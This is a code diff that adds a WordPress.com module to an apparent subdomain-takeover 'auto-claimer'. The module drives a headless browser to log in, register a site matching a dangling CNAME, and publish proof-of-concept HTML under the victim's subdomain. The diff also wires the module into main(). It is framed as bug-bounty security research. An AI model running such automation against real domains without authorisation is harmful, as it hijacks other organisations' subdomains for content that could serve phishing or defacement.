@@ -540,6 +540,173 @@ def claim_github_pages(subdomain, repo_name, researcher_name, creds):
     except Exception as e:
         return False, f"Error: {str(e)}"
 
+# WordPress.com Auto-Claimer
+def claim_wordpress_site(subdomain, site_name, researcher_name, creds):
+    """Automatically claim WordPress.com site and upload PoC."""
+    print(f"\n{'='*60}")
+    print(f"📝 WordPress.com Auto-Claimer: {site_name}")
+    print(f"{'='*60}")
+
+    try:
+        from selenium import webdriver
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.support.ui import WebDriverWait
+        from selenium.webdriver.support import expected_conditions as EC
+        from selenium.webdriver.chrome.options import Options
+        from webdriver_manager.chrome import ChromeDriverManager
+        from selenium.webdriver.chrome.service import Service
+
+        # Get WordPress credentials
+        wp_email = creds.get('wordpress', {}).get('email', '')
+        wp_password = creds.get('wordpress', {}).get('password', '')
+
+        if not wp_email or not wp_password:
+            return False, "WordPress.com credentials not configured"
+
+        # Generate PoC HTML
+        poc_html = generate_poc_html(subdomain, "WordPress.com", f"{site_name}.wordpress.com", researcher_name)
+
+        print(f"[1/6] Setting up browser automation...")
+        chrome_options = Options()
+        chrome_options.add_argument('--headless')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
+        chrome_options.add_argument('--disable-gpu')
+
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service, options=chrome_options)
+        wait = WebDriverWait(driver, 20)
+
+        print("  ✓ Browser ready")
+
+        try:
+            print(f"[2/6] Navigating to WordPress.com signup...")
+            driver.get("https://wordpress.com/start/user")
+            time.sleep(3)
+
+            print(f"[3/6] Creating WordPress account/logging in...")
+            # Try to find email field
+            try:
+                email_field = wait.until(EC.presence_of_element_located((By.NAME, "email")))
+                email_field.send_keys(wp_email)
+                time.sleep(1)
+
+                # Look for continue/next button
+                continue_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Continue') or contains(text(), 'Next')]")
+                if continue_btns:
+                    continue_btns[0].click()
+                    time.sleep(2)
+
+                # Enter password
+                password_field = wait.until(EC.presence_of_element_located((By.NAME, "password")))
+                password_field.send_keys(wp_password)
+                time.sleep(1)
+
+                # Submit
+                submit_btns = driver.find_elements(By.XPATH, "//button[@type='submit']")
+                if submit_btns:
+                    submit_btns[0].click()
+                    time.sleep(5)
+
+                print("  ✓ Logged in to WordPress.com")
+
+            except Exception as e:
+                print(f"  ⚠️  Login attempt had issues: {e}")
+                # Continue anyway - might already be logged in
+
+            print(f"[4/6] Creating new WordPress site: {site_name}...")
+            # Navigate to create new site
+            driver.get("https://wordpress.com/start/site-creation")
+            time.sleep(3)
+
+            # Try to enter site name
+            try:
+                site_input = wait.until(EC.presence_of_element_located((By.XPATH, "//input[contains(@placeholder, 'site') or contains(@placeholder, 'Site') or contains(@placeholder, 'name')]")))
+                site_input.clear()
+                site_input.send_keys(site_name)
+                time.sleep(2)
+
+                # Click continue/create
+                continue_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Continue') or contains(text(), 'Create')]")
+                if continue_btns:
+                    continue_btns[0].click()
+                    time.sleep(5)
+
+                print(f"  ✓ WordPress site created: {site_name}.wordpress.com")
+
+            except Exception as e:
+                print(f"  ⚠️  Site creation had issues: {e}")
+                # Site might already exist
+
+            print(f"[5/6] Uploading PoC content...")
+            # Navigate to site editor
+            driver.get(f"https://wordpress.com/post/{site_name}.wordpress.com")
+            time.sleep(3)
+
+            # Try to create a post with PoC content
+            try:
+                # Look for "Add New Post" or "New Post" button
+                new_post_btns = driver.find_elements(By.XPATH, "//a[contains(@href, '/post/') or contains(text(), 'New Post')]")
+                if new_post_btns:
+                    new_post_btns[0].click()
+                    time.sleep(3)
+
+                # Find editor and add content
+                # WordPress uses block editor, so we need to work with that
+                editor = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "editor-post-title__input")))
+                editor.send_keys("Security Research - Subdomain Takeover PoC")
+                time.sleep(1)
+
+                # Add content block
+                driver.execute_script("""
+                    var content = arguments[0];
+                    var block = wp.data.dispatch('core/block-editor').insertBlock(
+                        wp.blocks.createBlock('core/html', { content: content })
+                    );
+                """, poc_html)
+
+                time.sleep(2)
+
+                # Publish
+                publish_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Publish')]")
+                if publish_btns:
+                    publish_btns[0].click()
+                    time.sleep(2)
+                    # Confirm publish
+                    confirm_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Publish')]")
+                    if confirm_btns:
+                        confirm_btns[0].click()
+                        time.sleep(3)
+
+                print("  ✓ PoC content uploaded")
+
+            except Exception as e:
+                print(f"  ⚠️  Content upload had issues: {e}")
+
+            print(f"[6/6] Verifying PoC is live...")
+            website_url = f"https://{site_name}.wordpress.com"
+            time.sleep(3)
+
+            print(f"\n{'='*60}")
+            print(f"✅ SUCCESS! WordPress site claimed and PoC deployed")
+            print(f"{'='*60}")
+            print(f"📍 Subdomain: {subdomain}")
+            print(f"🌐 PoC URL: {website_url}")
+            print(f"📋 WordPress Site: {site_name}.wordpress.com")
+            print(f"🗑️  Cleanup: Delete site at https://wordpress.com/sites")
+            print(f"{'='*60}\n")
+
+            driver.quit()
+            return True, website_url
+
+        finally:
+            driver.quit()
+
+    except ImportError:
+        return False, "Selenium not installed. Run: pip install selenium webdriver-manager"
+    except Exception as e:
+        return False, f"Error: {str(e)}"
+
 # Main auto-claimer
 def main():
     """Main auto-claimer function."""
@@ -607,6 +774,11 @@ def main():
         elif 'GitHub' in service or 'Github' in service:
             repo_name = cname.replace('.github.io', '') if '.github.io' in cname else subdomain.split('.')[0]
             success, result = claim_github_pages(subdomain, repo_name, researcher_name, creds)
+            poc_url = result if success else None
+
+        elif 'WordPress' in service or 'Wordpress' in service:
+            site_name = cname.replace('.wordpress.com', '') if '.wordpress.com' in cname else subdomain.split('.')[0]
+            success, result = claim_wordpress_site(subdomain, site_name, researcher_name, creds)
             poc_url = result if success else None
 
         else:
